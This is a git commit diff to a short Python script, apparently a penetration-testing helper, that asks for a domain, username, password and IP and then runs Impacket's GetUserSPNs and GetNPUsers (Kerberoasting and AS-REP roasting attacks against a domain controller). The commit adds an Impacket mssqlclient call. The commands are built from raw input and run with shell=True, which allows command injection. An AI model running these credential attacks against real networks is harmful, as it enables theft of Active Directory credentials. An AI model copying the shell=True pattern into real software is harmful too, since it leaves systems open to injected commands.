959036ffcfab9de33406257cecde5228f91925cb
cagrigsby <162646448+cagrigsby@users.noreply.github.com>
2024-08-18 15:05:11 -0500

    Update StupidImpacket.py

--- StupidImpacket.py
+++ StupidImpacket.py
@@ -11,7 +11,9 @@ ip = input("Enter the IP address, idiot again: ")
 # Construct the commands
 command1 = f"impacket-GetUserSPNs {domain}/{user}:'{password}' -dc-ip {ip}"
 command2 = f"impacket-GetNPUsers {domain}/{user}:'{password}' -dc-ip {ip}"
+command3 = f"impacket-mssqlclient {domain}/{user}:'{password}' -dc-ip {ip}"
 
 # Run the commands
 subprocess.run(command1, shell=True)
 subprocess.run(command2, shell=True)
+subprocess.run(command3, shell=True)
